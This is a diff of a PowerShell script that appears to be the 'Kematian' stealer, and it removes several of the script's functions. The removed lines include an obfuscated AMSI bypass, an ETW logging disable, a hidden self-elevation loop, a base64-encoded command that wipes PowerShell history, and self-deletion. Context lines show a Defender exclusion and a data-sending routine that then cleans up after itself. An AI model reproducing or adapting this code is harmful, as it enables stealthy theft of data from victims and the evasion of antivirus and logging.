@@ -67,15 +67,6 @@ function KDMUTEX {
     Invoke-TASKS
 }
 
-# Request admin with AMSI bypass and ETW Disable
-function CHECK_AND_PATCH {
-    ${kematian} = [Ref].Assembly.GetType('System.Management.Automation.Am' + 'siUtils').GetField('am' + 'siInitFailed', 'NonPublic,Static');
-    ${CHaINSki} = [Text.Encoding]::ASCII.GetString([Convert]::FromBase64String("JGtlbWF0aWFuLlNldFZhbHVlKCRudWxsLCR0cnVlKQ==")) | &([regex]::Unescape("\u0069\u0065\u0078"))
-    ([Reflection.Assembly]::LoadWithPartialName((('Sy'+'st'+'em.'+'Core'))).GetType((('System.Diag'+'n'+'o'+'sti'+'cs.Ev'+'e'+'nting'+'.E'+'vent'+'Provi'+'der'))).GetField((('m_en'+'abled')), (('N'+'onP'+'ublic,'+'Instanc'+'e'))).SetValue([Ref].Assembly.GetType((('Syst'+'em.Ma'+'nage'+'ment.Aut'+'om'+'ation.'+'Tra'+'cing.'+'PSEtw'+'LogPr'+'ovider'))).GetField((('etw'+'Prov'+'ider')), (('Non'+'Pub'+'lic,Sta'+'tic'))).GetValue($null), 0))
-    $kematiancheck = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)
-    return $kematiancheck
-}
-
 function Invoke-TASKS {
     Add-MpPreference -ExclusionPath "$env:LOCALAPPDATA\Temp" -Force
     if ($persistence) {
@@ -109,22 +100,6 @@ function VMPROTECT {
 }
 if ($vm_protect) {
     VMPROTECT
-}
-
-function Request-Admin {
-    while (-not (CHECK_AND_PATCH)) {
-        if ($PSCommandPath -eq $null) {
-            Write-Host "Please run the script with admin!" -ForegroundColor Red
-            Start-Sleep -Seconds 5
-            Exit 1
-        }
-        if ($debug -eq $true) {
-            try { Start-Process "powershell" -ArgumentList "-NoP -Ep Bypass -File `"$PSCommandPath`"" -Verb RunAs; exit } catch {}
-        }
-        else {
-            try { Start-Process "powershell" -ArgumentList "-Win Hidden -NoP -Ep Bypass -File `"$PSCommandPath`"" -Verb RunAs; exit } catch {}
-        } 
-    }    
 }
 
 function Backup-Data {
@@ -1288,31 +1263,6 @@ function Backup-Data {
     Write-Host "[!] The extracted data was sent successfully !" -ForegroundColor Green
     # cleanup
     Remove-Item "$env:appdata\Kematian" -Force -Recurse
-}
-
-if (CHECK_AND_PATCH -eq $true) {  
-    KDMUTEX
-    if (!($debug)) {
-        CriticalProcess -MethodName InvokeRtlSetProcessIsCritical -IsCritical 0 -Unknown1 0 -Unknown2 0
-    }
-    $script:SingleInstanceEvent.Close()
-    $script:SingleInstanceEvent.Dispose()
-    #removes history
-    I'E'X([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("UmVtb3ZlLUl0ZW0gKEdldC1QU3JlYWRsaW5lT3B0aW9uKS5IaXN0b3J5U2F2ZVBhdGggLUZvcmNlIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVl")))
-    if ($debug) {
-        Read-Host -Prompt "Press Enter to continue"
-    }
-    if ($melt) { 
-        try {
-            Remove-Item $pscommandpath -force
-        }
-        catch {}
-    }
-}
-else {
-    Write-Host "[!] Please run as admin !" -ForegroundColor Red
-    Start-Sleep -s 1
-    Request-Admin
 }
 # SIG # Begin signature block
 # MIIXxQYJKoZIhvcNAQcCoIIXtjCCF7ICAQExCzAJBgUrDgMCGgUAMGkGCisGAQQB
